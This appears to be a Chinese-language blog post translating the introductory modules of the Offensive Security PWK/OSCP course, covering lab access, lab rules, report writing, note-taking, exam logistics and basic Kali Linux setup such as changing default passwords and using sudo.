[{"title":"OSCP随笔","url":"/2022/08/06/OSCP随笔/","content":"\n# OSCP - PWK\n\n------\n\n# 使用Kali Linux进行渗透测试:一般课程信息\n\n欢迎来到 Kali Linux 的渗透测试(PWK)课程!\n\nPWK 是为那些想在专业渗透测试领域迈出严肃而有意义的一步的系统和网络管理员以及安全专家而设立的。本课程将帮助你更好地了解恶意实体对网络的攻击和技术。恭喜你迈出了第一步。我们很高兴你在这里。\n\n## 关于 PWK 课程\n\n让我们花点时间来回顾一下课程本身和它的每一个组成部分。你现在应该可以访问以下内容：\n\n- PWK课程材料\n- 接入内部VPN实验室网络\n- Offensive Security 学生论坛\n- 实时支持\n- OSCP考试的尝试\n\n让我们逐一回顾这些项目。\n\n### PWK 课程材料\n\n该课程包括PDF格式的实验指南和配套的课程视频。PDF和视频中涵盖的信息是重叠的，这意味着你可以先阅读实验指南，然后观看视频来填补任何空白，反之亦然。在某些模块中，实验指南比视频更详细。在其他情况下，视频可能比指南更能传达一些信息。重要的是，你要密切注意这两方面的内容。\n\n实验指南在每一章的末尾还包含练习。 完成课程练习将帮助你在尝试发现和利用实验室机器中的漏洞时变得更有效率。\n\n### 接入内部 VPN 实验室网络\n\n你在开课日收到的电子邮件欢迎包中包括你的VPN证书和相应的VPN连接包。这些将使您能够访问内部VPN实验室网络，您将在那里花费大量的时间。\n\n实验时间从您的课程开始时开始，并以连续访问的方式计量。实验室时间只有在紧急情况下才可以暂停。$^1$\n\n如果你的实验时间过期或即将过期，你可以在任何时候购买实验延期。要购买额外的实验室时间，请使用发送到你的电子邮件地址的个性化购买链接。如果你在实验室访问仍然有效时购买实验室延期，你可以继续使用相同的VPN连接包。 如果你在现有的实验室访问结束后购买实验室延期，你将收到一个新的VPN连接包。\n\n### Offensive Security 学生论坛\n\n学生论坛$^2$只有 Offensive Security 专业的学生才能进入。你的论坛凭证也是电子邮件欢迎包的一部分。访问权不会因为你的实验时间结束而过期。在你通过OSCP考试后，你可以继续享受论坛。\n\n在论坛上，你可以提出问题，分享有趣的资源，并提供提示（只要没有破坏性的内容）。我们要求所有的论坛成员注意他们所发布的内容，特别注意不要因为发布完整的解决方案而破坏他人的整体课程体验。不周到的帖子可能会被审核。\n\n除了来自其他学生的帖子外，你还会发现一些额外的资源，可以帮助澄清课程中提出的概念。 这些资源包括实验室机器子集的详细演练。 这些演练的目的是说明实现最佳结果所需的思维方式和方法。\n\n一旦你成功通过 OSCP 考试，你将获得进入证书持有者分论坛的权限。\n\n### 实时支持\n\n实时支持$^3$将使您能够直接与我们的学生管理员沟通。这些是参加过PWK课程并通过OSCP认证考试的 Offensive Security 的工作人员。\n\n学生管理员可以帮助解决技术问题，但他们也可以澄清教材和练习中的项目。此外，如果你已经尽力了，但在实验机上完全卡住了，学生管理员可能会提供一个小提示来帮助你前进。\n\n记住，学生管理员提供的信息将基于你能够提供的细节数量。你能提供的关于你已经尝试过的东西和你能够观察到的结果的细节越多越好。\n\n### OSCP 考试机会\n\n在你初次购买 PWK 课程时，包括一次 OSCP 认证考试$^4$的尝试。该考试是可选的，所以由你自己决定是否要参加考试。在你的实验时间结束后，你有 120 天时间来安排和完成你的考试尝试。120 天后，尝试将过期。\n\n如果你的考试尝试过期，你可以再购买一次，并在购买日期的120天内参加考试。\n\n如果你在仍有未使用的考试尝试时购买了实验室延期，你的考试尝试的到期日将被移至实验室延期结束后的120天。要预定你的OSCP考试，请使用你的个人化考试安排链接。这个链接包括在欢迎包的电子邮件中。\n\n你也可以使用你的PWK控制面板找到这个链接。\n\n## 接近课程的总体策略\n\n每个学生都是独一无二的，所以没有一个绝对最好的方法来处理这个课程和材料。我们希望鼓励你以你自己舒适的速度完成课程。你还需要运用时间管理技巧来保持自己的进度。\n\n我们建议将以下内容作为课程材料的一个非常普遍的方法：\n\n1. 复习包括在欢迎和课程信息电子邮件中的所有信息。\n2. 复习一下课程材料。\n3. 完成所有的课程练习。\n4. 完成所有的课程练习。\n\n### 欢迎和课程信息电子邮件\n\n首先，也是最重要的，花时间阅读你在课程开始日收到的电子邮件中包含的所有信息。这些电子邮件包括诸如您的VPN包、实验室和论坛证书以及控制面板的URL。 它们还包括课程常见问题解答、特别有用的论坛主题和支持页面的URL。\n\n### 课程材料\n\n一旦你回顾了上述信息，你就可以进入课程材料。你可以选择从课程视频开始，然后在实验指南中复习该模块的信息，或者反之亦然，这取决于你喜欢的学习方式。当你通过课程材料时，你可能需要重新观看或重新阅读模块以完全掌握内容。\n\n我们建议把这个课程当作马拉松，而不是冲刺。在推进课程之前，不要害怕在困难的概念上多花时间。\n\n### 课程练习\n\n我们建议你在进入下一个模块之前，完全完成每个模块末尾的练习。它们将测试你对材料的理解，并建立你前进的信心。\n\n完成这些练习所需的时间和精力可能取决于你现有的技能。请注意，有些练习是困难的，可能需要大量的时间。我们希望鼓励你持之以恒，尤其是对较难的练习。它们对培养Offsec的 \"努力尝试 \"的心态特别有帮助。\n\n### PWK 实验室\n\n一旦你完成了课程材料，你就应该准备好去做实验，目的是渗透每台机器并获得一个高权限的交互式 Shell。\n\n课程练习包括有关各种实验室机器的信息，如果你一直勤于记笔记，你将有足够的能力去攻克实验室中的一些 \"低悬的果实\"。\n\n下一步是应用从课程中学到的知识，从对网络的其他部分进行彻底的信息收集开始，并利用从被攻击的机器上获得的信息来锁定其他机器。 如果你正在为如何处理一台特定的机器而苦恼，可以考虑去学生论坛上看看，作为第一步。\n\n如果论坛没有为你提供任何有用的信息，你应该联系实时支持，看看是否有任何其他指导。\n\n## 获得支持\n\nPWK不是一个固定速度的课程。 这意味着你可以按照自己的节奏进行，在对你来说有难度的题目上花更多时间。利用这个课程的节奏，不要害怕在一个困难的新课题或方法上多花点时间。没有什么比自己摸索出一些东西更有意义的了。\n\n话虽如此，有时联系支持是完全合适的。在你这样做**之前**，请理解我们希望你在进入实验室之前已经看过所有的课程材料，并且在需要的时候会毫不犹豫地让你回到课程材料中。不仅如此，我们还希望你能通过进行额外的研究来深入挖掘该主题领域。\n\n在与支持部门联系之前，以下常见问题页面可能有助于回答你的一些问题（在没有VPN的情况下都可以访问）：\n\n- https://support.offensive-security.com/\n- https://www.offensive-security.com/faq/\n\n如果你的问题没有得到解决，我们建议你查看学生论坛，该论坛也可以在内部VPN实验室网络之外访问。如果你仍然无法找到你需要的帮助，你可以通过访问支持页面的实时支持$^5$或发送电子邮件（help@offensive-security.com）与我们的学生管理员取得联系。\n\n## 关于渗透测试\n\n渗透测试是对目标或边界进行研究和攻击的一个持续循环。攻击应该是结构化的，经过计算的，并且在可能的情况下，在实验室中进行验证，然后再在实际目标上实施。这就是我们对渗透测试过程的可视化：\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e5327495-6c39-4ed0-b1a4-525cf2a267d9/Untitled.png)\n\n图1：渗透测试方法的示意图\n\n正如该模型可能暗示的那样，你收集的信息越多，成功穿透的概率就越高。一旦你穿透了最初的目标边界，你通常会再次开始这个循环。例如，你可能会收集有关内部网络的信息，以便更深入地渗透它。\n\n最终，每个安全专家都会制定自己的特定方法，通常是基于特定的技术优势。我们鼓励你查看诸如开放网络应用安全项目（OWASP）$^6$的网页，了解一些常用的渗透测试方法。\n\n## 法律\n\n请花时间阅读我们下面的正式版权声明。\n\n在你这样做之前，我们想解释一下，本出版物仅供你个人使用。任何复制本出版物或与任何第三方分享本出版物的全部或部分内容的行为都违反了（a）我们的知识产权（b）您在我们这里注册时接受的合同条款（c）我们的学术政策。\n\n这包括:\n\n- 通过在任何第三方平台、资源库或社交媒体网站上发布本出版物，向其他人提供。\n- 由于你没有充分注意保护本出版物，无意中分享了本出版物\n- 将本出版物的全部或部分内容用于您个人培训以外的任何目的，包括提供或告知任何其他培训课程的内容或用于任何其他商业目的。\n\n我们的学术政策可以在以下网站找到 https://www.offensive-security.com/legal-docs/ 在我们的判断中，如果我们发现你违反了：\n\n- 我们将撤销你已获得的所有现有 Offensive Security 认证\n- 我们将终身取消你参加任何 Offensive Security 课程和考试的资格\n- 我们将终身取消你今后购买 Offensive Security 产品的资格\n\nCopyright © 2020 Offsec Services Ltd. 版权所有。保留所有权利--未经Offensive Security事先书面许可，本出版物/视频的任何部分均不得复制、出版、共享、再分发、再许可、传输、更改、用于创造衍生作品或以任何其他方式利用。\n\n以下文件包含了本课程的实验练习，只能在Offensive Security托管的实验环境中进行尝试。 请注意，如果在没有明确许可的机器上尝试测试和攻击，实验室指南中描述的大多数攻击都是非法的。由于 Offensive Security 公司的实验室环境与互联网隔离，在实验室内进行攻击是安全的。Offensive Security 公司没有授权你在其托管的实验室环境之外进行这些攻击，并对任何此类行为不承担任何责任或义务。\n\n## [DomainsMegaCorpone.com](http://DomainsMegaCorpone.com) 和 Sandbox.local 域名\n\n[megacorpone.com](http://megacorpone.com/) 域名及其子域名代表了一个由 Offensive Security 创建的虚构公司。它有一个看似脆弱的外部网络存在，这是说明整个课程中某些概念的理想选择。\n\n请注意，该域可在内部VPN实验室网络之外访问，只能在课程练习中用于被动和主动收集信息。严禁主动尝试破坏它。\n\nsandbox.local 域代表一个虚构的公司内部网络，用来演示使用课程中所涉及的方法和技术进行的全面渗透测试。\n\nsandbox.local 域只能通过VPN访问，作为你实验室访问的一部分。\n\n## 关于 PWK VPN 实验室\n\nPWK实验室提供了一个隔离的环境，包含各种易受攻击的机器。使用实验室来完成课程练习，并练习课程材料中所教授的技术。\n\n下图是 PWK 实验室的简化图。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/abcf00dd-2645-4dbc-90e0-74641128b71e/Untitled.png)\n\n图2：VPN 实验室的简化示意图\n\n一旦你完成了课程视频和 PDF 实验指南，你将拥有渗透实验室中大多数脆弱机器所需的基本技能。最初，你将通过 VPN 连接到学生网络。 随着课程的进行，你将会以黑客的方式进入其他网络。某些机器需要额外的研究和很大的决心才能攻破它们。\n\n每台机器都包含一个 **proof.txt** 文件，作为你妥协的战利品，但请记住，目标不是具体找到**proof.txt** 文件。相反，你要尝试在每台机器上获得一个 root/SYSTEM 级别的交互式外壳。 有些机器可能还包含一个 **network-secret.txt** 文件。你可以将该文件的内容提交给你的控制面板，以解锁将IT、开发和管理部门网络中的虚拟机恢复到原始状态的能力。\n\n请注意，本指南（和视频）中介绍的 IP 地址不一定反映 Offensive Security 实验室的 IP 地址。不要试图逐字逐句地复制实验室指南中的例子。 你将需要根据你的具体实验室配置来调整这些例子。\n\n你应该针对的机器是：\n\n表1 - Offensive Security 实验室的目标范围\n\n你所连接的实验室是由一些不同的学生共享的。我们限制每个实验室的学生人数，以尽量减少有一个以上的学生同时在同一目标机上工作的可能性。\n\n### 实验室警告\n\n内部VPN实验室网络**是一个恶劣的环境**，你不应该在用于连接实验室的Kali Linux虚拟机上存储敏感信息。学生与学生之间的VPN流量是不允许的，但是，你可以通过在不使用服务时停止这些服务，并确保在你的Kali Linux系统上改变任何默认密码来帮助保护自己。\n\n### 控制面板\n\n一旦登录到内部 VPN 实验室网络，你就可以进入你的 PWK 控制面板。PWK 控制面板将帮助你恢复你的客户机和实验机，或预订你的考试。一旦你找到 **network-secret.txt** 文件，你将使用控制面板，提交该文件的内容，并解锁恢复机器的能力。文件，并解锁恢复位于你所发现的其他网络中的机器的能力。\n\n控制面板的网址列在欢迎包的电子邮件中。\n\n### 恢复\n\n每个学生每24小时都有12次恢复的机会。恢复功能使你可以将特定的实验机恢复到原始状态。如果你需要额外的恢复，你可以通过电子邮件（help@offensivesecurity.com）联系学生管理员，或者联系在线支持$^7$来重置你的恢复计数器。\n\n实验机恢复的最小间隔时间是5分钟。\n\n当选择下拉菜单来恢复一台实验室机器时，你可以看到该机器最后一次被恢复的时间。实验机中的一些机器将包含脚本，自动重启崩溃的服务或模拟用户的操作。这不是每个系统的情况，但在扫描或利用一个特定的目标机器时，请考虑到这一点。\n\n我们建议你在开始扫描和攻击一台机器之前，先将其还原，以确保机器及其服务按设计运行。反过来说，一旦你完成了对一台机器的攻击，你也应该还原它，以清除你的攻击所留下的任何人工制品，这样机器就不会处于被利用的状态。\n\n### 客户机\n\n你将被分配到三台专用的客户机，与课程材料和练习一起使用。其中包括一个 Windows 10 客户端，Debian Linux 客户端，以及一个 Windows Server 2016 域控制器。\n\n**每当你连接到VPN时，你将需要通过学生控制面板还原你想使用的机器**。当你选择恢复 Windows10 或 Windows Server 2016 客户端时，两台机器都将被恢复。你指定的客户机在你与 VPN 断开连接一段时间后，会自动关闭电源并恢复到初始状态。\n\n考虑到上述情况，我们强烈建议你**不要在你的任何客户机上存储任何你不愿意丢失的信息**。\n\n### Kali 虚拟机\n\n我们在课程中提供给你使用的 VMware 镜像$^8$是Kali Linux 的默认 64 位构建。我们建议你通过电子邮件欢迎包中提供的URL下载并使用 VMware 镜像。虽然你可以自由地使用 VirtualBox 或 Hyper-V镜像，甚至你自己的 Kali 安装，但我们只能为提供的 VMware 镜像提供支持。这些图像是由Offensive Security 提供的，Kali Linux 项目组不支持。\n\n### 实验室行为和实验室限制\n\n进攻性安全实验室是一个共享环境。 在你探索实验室时，请记住以下几点：\n\n- 避免改变用户密码。相反，如果可能的话，向系统添加新的用户。如果进入机器的唯一方法是改变密码，一旦你完成了对该特定机器的访问，请善意地把它改回来。\n- 你在机器上禁用的任何防火墙规则，一旦你获得了所需的访问级别，就应该恢复。\n- 不要让机器处于非可开发状态。\n- 一旦你完成了工作，应从机器上删除任何成功（和失败）的利用。如果可能的话，创建一个目录来存储你的漏洞。这将最大限度地减少其他人意外地使用你的漏洞攻击目标的机会。\n\n一旦你完成了对每台机器的操作，你可以通过记住恢复每台机器来实现这一切。要恢复一台机器，请使用学生控制面板。\n\n以下限制在内部VPN实验室网络中被严格执行。如果你违反了以下任何限制，进攻性安全公司保留取消你的实验室访问权的权利。\n\n1. 不要对网络进行ARP欺骗或进行任何其他类型的中毒或中间人攻击。\n2. 不要删除或重新定位任何关键的系统文件或提示，除非是权限提升的绝对必要。\n3. 不要改变 network-secret.txt 或 proof.txt 文件的内容。\n4. 不要故意扰乱正在实验室工作的其他学生。这包括但不限于：\n   1. 关闭机器\n   2. 将用户踢出机器\n   3. 封锁一个特定的 IP 地址或范围\n   4. 入侵其他学生的客户端或 Kali 机器\n\n## 报告\n\n报告通常被视为渗透测试的必要之恶。可悲的是，许多高技术和高智商的渗透测试人员并没有给予它应有的重视，但一份写得很好、看起来很专业的报告有时会比写得很差、但很有技术含量的同类报告获得更多的积极关注。\n\n由于撰写报告是任何渗透测试的一部分，而且是 OSCP 考试的一部分，我们想在你接近课程材料之前花点时间谈谈报告的撰写。我们希望，现在回顾这些准则将帮助您考虑如何解释渗透测试的行动、结果和结果。\n\n有许多不同的报告写作方法，我们不会声称 Offensive Security 报告样本$^9$是绝对最好的报告写作方法。如果这个例子有帮助，请随意使用。如果不是，那么请随意改变设计或创造其他更适合你的方法。\n\n有一些我们认为在写报告时必须牢记的一般准则。这些准则没有特别的顺序，因为它们都同样重要。\n\n### 考虑目标\n\n考虑到评估的目标。你设定的目标是什么？你是否希望在报告中作出单一的、具体的陈述？许多没有经验的渗透测试人员会被评估的技术方面和完成评估所需的技能所吸引，但渗透测试绝不是一个简单炫耀的机会。 在你开始写报告时，要牢记最初的目标。\n\n组织你的内容，建立一个能与你的听众产生最大共鸣的报告。我们强烈建议在开始之前写一个大纲。 你可以通过创建章节标题来快速而轻松地完成这一工作，而不需要实际的内容或解释。 这将帮助你避免重复自己或遗漏关键信息。它还可以帮助你更容易地克服可怕的 \"写作障碍\"。\n\n### 考虑听众\n\n想一想谁会阅读你在报告中所包含的信息并采取行动。你的听众希望从报告中学到什么？ 他们是谁？ 在大多数情况下，具有不同技术知识水平的人都会阅读你的报告。试着写一些东西来满足报告的每个潜在读者。\n\n实际上，这意味着把你的报告分成几个部分来写，以满足不同听众的需要。\n\n让我们花点时间再谈谈观众的问题。\n\n你可能期望公司的高层管理人员阅读报告的某些部分。在大多数情况下，这些高管没有时间或愿望来阅读攻击的所有高度技术性细节。 出于这个原因，大多数报告以执行摘要开始。 执行摘要应该是一个简短的（不超过两页），对结果和客户的整体安全状况的高级解释。由于这可能是他们唯一会读到的部分，请确保你为高管们专门定制这一部分和语言。\n\n还会有一个由更多技术专家组成的团队，他们会更详细地阅读你的报告。 报告的其余部分应该迎合他们，并将包括你对目标网络造成的大屠杀的所有血腥细节。\n\n### 考虑包括哪些内容\n\n更具体地说，考虑一下**不包括**哪些内容是很有帮助的。请记住，你的读者 你的读者会想解决你发现的问题，所以你包括的所有内容应该是 相关和有意义。一份臃肿的报告，包含了太多切身的或不相关的信息，只会 让你的读者难以阅读和理解。不要为了让报告看起来更长而加入填充材料 使报告看起来更长。\n\n这里有四个关于包括什么和不包括什么的快速指南：\n\n1. **除非**绝对相关，否则不要在您的报告中包括一页又一页的工具输出。考虑一下Nmap的输出。您没有理由在您的报告中包括输出的每一行，因为它不会增加任何价值。如果您有一个想表达的观点，例如在公开访问的主机上暴露了非常多的SNMP服务，那么使用**-oG**标志，只把那些开放SNMP端口的主机找出来。\n2. 明智地使用屏幕截图。这条规则与你添加到报告中的其他内容一样适用。使用屏幕截图来说明问题，而不仅仅是为了显示令人敬畏的meterpreter输出。例如，假设你在一台Linux主机上获得了root权限。与其显示15张只有root用户才能访问的各种目录列表的截图，不如只包括一张**whoami**命令输出的截图。一个精通技术的读者可能只需要这一件事就能理解你所取得的成就。\n3. 包括额外的材料作为额外的支持文件。如果你的内容会推高页数，但对整个受众来说并不感兴趣，可以考虑在报告之外提供额外的支持文件。需要这些信息的读者仍然可以检查支持文件，报告的质量也不会受到影响。\n4. 也许最重要的是，要回到评估的目标上来。想一想你想表达的观点，因为它与目标有关，并想一想每条信息将如何或如何加强该观点。\n\n### 考虑介绍\n\n内容的表述与内容本身一样关键。 掌握语言绝对是最关键的。虽然我们理解对我们的许多学生来说，英语不是他们的母语，但尝试写出连贯的句子，使之流畅和有逻辑性，仍然很重要。在这种情况下，重要的是 \"更努力\"，尽最大努力，集中精力提出简单易懂的观点。\n\n此外，你可能想记住以下几点：\n\n1. 要保持一致。注意诸如间距、标题风格、字体选择等方面的不一致。错位和不一致的段落或标题看起来很不专业，很草率。\n2. 拼写检查，拼写检查，拼写检查! 这个是不言自明的。Their != There, Your != Yourre\n\n这些要点应该让你大致了解如何写出一份专业的、连贯的报告，清楚地传递预期的信息。 归根结底，报告是你交付给客户的产品。确保它正确而专业地代表你和你的工作。\n\n### PWK 报告\n\n在你完成课程实验指南和视频后，你将在我们的内部VPN实验网络内进行一次全面的渗透测试。对这次实践渗透测试的报告不是强制性的，但它可能对你有好处，因为它是练习你在整个职业生涯中都会用到的重要技能的一种有用方法。\n\n如果你选择写并提交你的实验报告，你需要记录本实验指南中的课程练习，除非另有说明。你可以将这些内容作为附录添加到你的最终报告中，你将在完成认证考试后提交。\n\n最后的文件应作为正式的渗透测试报告提交。 您的报告应包括执行摘要，以及所有机器（不包括您的专用客户机）的详细情况。 有关该课程报告要求的详细信息，包括模板和报告样本，可在我们的支持网站 $^{10}$ 上找到。\n\n除了可选的VPN实验室网络渗透测试报告外，选择OSCP认证的学生必须提交一份考试渗透测试报告。该报告应明确说明他们是如何成功实现认证考试目标的。这份最终报告必须在认证考试结束后24小时内以PDF格式发回给我们的认证委员会。\n\n计划在通过OSCP认证考试之前申请CPE学分的学生，需要撰写并提交一份内部VPN实验网络的报告，并将课程练习作为附录。\n\n## 做笔记\n\n信息是关键，所以做笔记和保持有条理的笔记是至关重要的。这适用于PWK课程、相应的OSCP考试，甚至是一般的渗透测试。\n\n笔记的详细程度由你自己决定。我们建议你一开始就记录**一切**。这包括所有的控制台输出，以及关键事件的屏幕截图。有太多的东西总比为了填补空白而重复材料要好。\n\n从一开始就有条不紊，从长远来看会有收获。如果你在几周、几个月、甚至几年后需要返回你的笔记，组织工作将使你能够迅速找到你需要的信息。培养良好的文档技能还可以让你迅速找到几天前用来攻击某台机器的长命令，如果你需要重新攻击它，或者在成功入侵每台目标机器后，在攻击后交叉参考用户。\n\n随着时间的推移，你将开始为你的笔记生成粗略的模板和格式。因此，在课程开始和结束时，你的笔记布局和细节会有所不同。我们经常听到学生评论说，他们在开始时错过了某些信息，而他们不得不回到 \"早期目标 \"去收集这些信息。\n\n争取从一个目标上收集尽可能多的信息。这将使你能够生成一份完整的报告，即使你不能进入实验室。拥有好的、详细的笔记在实验室开发后的阶段将特别有用，因为有某些信息是现成的，应该有助于你找到实验室机器之间的明确联系，等等。一个好的记录过程将为你节省相当多的时间，也会为你节省一些头痛的问题。\n\n### 设置与提示\n\n做好笔记的关键是能够收集尽可能多的信息，并能随时获取这些信息。信息量可能会随着时间的推移而变化，而你快速找到所需信息的过程也可能会发生变化。\n\n你还需要了解信息的存储地点--是本地还是远程？它是否被加密？ 是否有任何敏感信息是你笔记的一部分？ 如果有，请考虑你的信息（或者更糟糕的是，你的客户的信息）可能会落入坏人手中。\n\n开始时，我们强烈建议你捕捉和记录一切。 某些工具支持将其输出写入文件，其中一些工具甚至有报告功能。捕捉你的终端输出，然后将其与你的个人笔记相结合，有时也会有帮助。 确保注释，突出重要部分，并写下任何你认为相关的东西。请记住，有时一张截图胜过千言万语，所以请确保你也拍下它们。\n\n### 记笔记的工具\n\n有很多笔记工具可以选择，如 OneNote$^{11}$（Windows/MacOS）、DayOne$^{12}$（macOS）或 Joplin$^{13}$（MacOS/Windows/Linux）等。\n\n你也可以选择使用像 MDwiki$^{14}$ 这样的工具，它是一个基于 markdown 的 wiki，允许你用 markdown 写作，然后用 HTML 渲染输出。\n\n无论你喜欢哪种工具，收集RAW输出的最好方法是设置某种类型的记录，然后忘记它（直到需要它）。这样一来，输出就会自动保存，你就不必担心要记得返回你的笔记。有几种方法可以使显示在终端的所有输出得到保存，其中一些方法包括：\n\n- script：一旦执行，所有的输出（包括bash的颜色和后缀）都会被保存到一个文件中，可以在任何时候重新播放。\n- terminator：一个备用的终端模拟器，具有各种功能和插件，如Logger（将所有输出保存到文本文件）和TerminalShot（在终端内进行屏幕截图）。\n\n**注意**：管道输出（>）或使用tee也是一种选择，但你必须对每个命令使用它们，所以你必须记住每次都要运行它们。\n\n为了处理渗透测试期间收集到的大量信息，我们喜欢使用一个多用途的笔记应用程序来初步记录我们的所有发现。 使用这样的应用程序既有助于从数字上组织数据，也有助于从精神上组织数据。渗透测试结束后，我们可以使用临时文件来编制完整的报告。\n\n只要输出结果清晰易读，你用哪种程序做临时文件并不重要。 习惯于记录你的工作和发现。 这是完成工作的唯一专业方式!\n\n### 备份\n\n有两种人：一种是定期备份他们的文件，另一种是希望他们这样做。备份通常被认为是一种保险。你永远不知道你什么时候会需要它，直到你需要它为止! 作为一般规则，我们建议你定期备份你的文件。把你的备份保存在一个安全的地方。你肯定不希望它们最终出现在公共git repo或云中！\n\n文件不应该是你唯一备份的东西。确保你备份了你的Kali虚拟机上的重要文件，如果需要的话，采取适当的快照，等等。谨慎行事总是最好的。\n\n## 关于 OSCP 考试\n\nOSCP认证考试模拟了一个包含少量脆弱机器的私有VPN的实时网络。 要通过考试，你必须得到 70 分。 对有限的访问以及完全的系统破坏都会得到分数。在考试期间，环境是完全为你服务的，你将有23小时45分钟来完成考试。\n\n每台目标机的具体说明将位于你的考试控制面板中，只有在考试开始后你才能使用你的考试包，包括一个VPN连接包和其他明，将包含唯一的URL，你可以用来访问你的考试控制面板。\n\n为了确保我们认证的完整性，考试将采用远程监考。你需要在考试开始前15分钟到场，进行身份验证和其他考前工作。在安排考试之前，请务必阅读我们的监考常见问题$^{15}$。\n\n考试结束后，你将有额外的24小时来整理你的考试报告并记录你的发现。你将根据考试报告的质量和内容进行评估，所以请尽可能多地包括细节，并确保你的发现都是可重复的。\n\n另外，请注意，接受你的考试提交是一个人工过程，所以在你收到我们的正式通知说我们已经收到你的文件之前，可能需要一些时间。\n\n一旦你的考试文件被接受，你的考试将被打分，你将在10个工作日内收到你的成绩。 如果你达到了合格的分数，我们会要求你确认你的实际地址，以便我们能够邮寄你的证书。如果你没有达到要求，那么我们会通知你，你可以使用适当的链接购买认证重考。\n\n我们强烈建议你把考试时间仔细安排在36小时内，确保没有外界干扰或承诺。 另外，请注意，考试的可用性是以先到先得的方式处理的，所以最好尽可能提前安排考试，以确保你的首选日期可用。 关于考试的其他信息，我们鼓励你花一些时间来阅读OSCP考试指南$^{16}$。\n\n### Metasploit 的使用 - 实验室与考试\n\n我们鼓励你在实验室里使用Metasploit。Metasploit是一个伟大的工具，你应该学习它所提供的所有功能。虽然Metasploit的使用在OSCP认证考试中受到限制，但我们将鼓励你在学习过程中不要对自己施加任意的限制。关于Metasploit使用的更多信息可以在OSCP考试指南中找到。\n\n## 结束语\n\n在这个模块中，我们讨论了充分利用PWK课程和实验室所需的重要信息。此外，我们还介绍了报告写作的基本知识以及如何参加OSCP的最终考试。\n\n我们祝愿你在PWK的旅程中好运，并希望你享受你将面临的新挑战。\n\n# 舒适地使用 Kali Linux\n\nKali Linux 是由 Offensive Security 开发、资助和维护的。它是一个基于 Debian 的 Linux 发行版，旨在进行高级渗透测试和安全审计。Kali 包含几百个工具，面向各种信息安全任务，如渗透测试、安全研究、计算机取证和逆向工程。\n\n所有随操作系统打包的程序都经过了评估，以确定其适用性和有效性。 它们包括用于网络渗透测试的Metasploit，用于端口和漏洞扫描的Nmap，用于监控网络流量的Wireshark，以及用于测试无线网络安全的Aircrack-ng等等。\n\n本模块的目标是提供一个基线，让所有技能水平的用户为即将到来的模块做好准备。我们将探讨新用户的技巧和窍门，并回顾一些高级用户可能欣赏的标准。无论技能水平如何，我们都建议在本模块中关注适当的水平。正如亚伯拉罕-林肯被传言的那样，\"给我六个小时去砍一棵树，我将花前四个小时去磨斧头\"。\n\n此外，我们鼓励所有技能水平的用户查看Kali培训网站上的免费在线培训。17这个网站包括KaliLinux Revealed一书，旨在测试你的理解的练习，一个专门的支持论坛，以及更多。 这些免费资源为所有技能水平的用户提供了有价值的见解，是本课程培训的一个很好的补充。\n\n## 启动 Kali Linux\n\n首先，下载官方的Kali Linux 64位（amd64）VMware虚拟机（VM）$^{18}$和你选择使用的VMware软件。VMware为VMware WorkStation Pro$^{19}$ 和VMware Fusion for Mac提供了免费试用版。$^{20}$ 使用这些商业版本的好处是能够拍摄快照，如果你需要重置你的虚拟机到一个干净的地方，你可以恢复到快照。VMware还提供了一个免费版本的软件，即VMware WorkStation Player.$^{21}$但是，免费版本没有快照功能。\n\n我们将使用一个64位（amd64）的Kali Linux虚拟机，所以为了获得最佳效果并与实验指南保持一致，我们建议你也使用它。不要偏离这个标准的构建，因为这可能会创造一个与课程培训材料不一致的工作环境。\n\n你可以在Offensive Security的支持网站$^{22}$上找到最新的Kali Linux虚拟机镜像以及最新的验证下载档案的说明。作为一个安全专家，你应该在使用任何你下载的文件之前总是花时间正确验证它。不这样做会使你和你的客户面临不必要的风险。\n\n为了使用Kali Linux虚拟机，我们将首先解压存档，并用VMware打开.vmx文件。如果出现了选项，请选择 \"我复制了它\"，以指示虚拟机生成一个新的虚拟MAC地址，避免潜在的冲突。\n\n虚拟机的默认凭证是：\n\n- **Username**: kali\n- **Password**: kali\n\n<aside> 💡 在第一次启动时，从终端使用passwd命令更改所有默认密码是很重要的。我们要和其他学生一起连接到一个在线实验室，默认密码几乎可以保证俏皮的滥用!\n\n</aside>\n\n要改变密码，点击终端图标，发出内置的passwd命令：\n\n```bash\nkali@kali:~$ passwd\nChanging password for kali.\n(current) UNIX password:\nEnter new UNIX password:\nRetype new UNIX password:\npasswd: password updated successfully\n```\n\n清单 1 - 更改 kali 用户的默认密码\n\nKali Linux虚拟机将包含两个默认用户，\"root \"和 \"kali\"。我们将使用kali用户账户。虽然作为根用户登录可能是很诱人的，但不建议这样做。根用户有不受限制的访问权，一个不小心的命令可能会破坏我们的系统。更糟糕的是，如果对手利用以root身份运行的进程，他们将完全控制我们的机器。\n\n许多命令需要高权限才能运行，幸运的是，sudo命令可以克服这个问题。我们在我们希望运行的命令后面输入sudo，并在提示时提供我们的密码。\n\n```bash\nkali@kali:~$ whoami\nkali\n\nkali@kali:~$ sudo whoami\n[sudo] password for kali:\nroot\n```\n\n清单2 - 使用sudo以root身份运行一个命令\n\n最后，探讨一下VMware的快照功能，它允许我们将虚拟机恢复或重置到一个干净的地方。如果出了问题，定期快照可以节省大量的时间和挫折感。\n\n## Kali 菜单\n\nKali Linux的菜单包括对发行版中的许多工具的分类链接。这种结构有助于澄清每个工具的主要作用，以及其使用的背景。\n\n花点时间浏览一下Kali Linux的菜单，帮助自己熟悉可用的工具和它们的类别。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/884573bb-cb89-4b1b-9ba1-d04030299bde/Untitled.png)\n\n图1：Kali的菜单\n\n作为一个完整的操作系统，Kali Linux提供了许多特性和功能，我们无法在本课程中完全探索。然而，有一些官方的Kali Linux资源可供进一步研究和学习。\n\n- Kali Linux 官方文档$^{23}$\n- Kali Linux 支持论坛$^{24}$\n- Kali Linux 工具网站$^{25}$\n- Kali Linux 错误跟踪器$^{26}$\n- Kali Linux 培训$^{27}$\n\n### Kali Linux 官方文档\n\nKali Docs网站$^{28}$，顾名思义，是Kali Linux的官方文档库。 这个网站提供了最新的Kali文档，详细介绍了许多常见的程序，并且应该被认为是Kali Linux故障排除和支持的第一站。\n\n### Kali Linux 支持论坛\n\n下一站是Kali Linux支持论坛$^{29}$。在发帖之前，请阅读论坛的规则和指南$^{30}$，因为不符合规定的帖子通常会被审核或忽略掉。在创建一个新的主题之前，一定要在论坛上彻底搜索之前发布的解决方案。\n\n### Kali Linux 工具网站\n\nKali具有许多渗透测试工具，来自安全和取证领域的各种利基。 Kali工具网站$^{31}$旨在列出所有这些工具，并为每个工具提供快速参考。 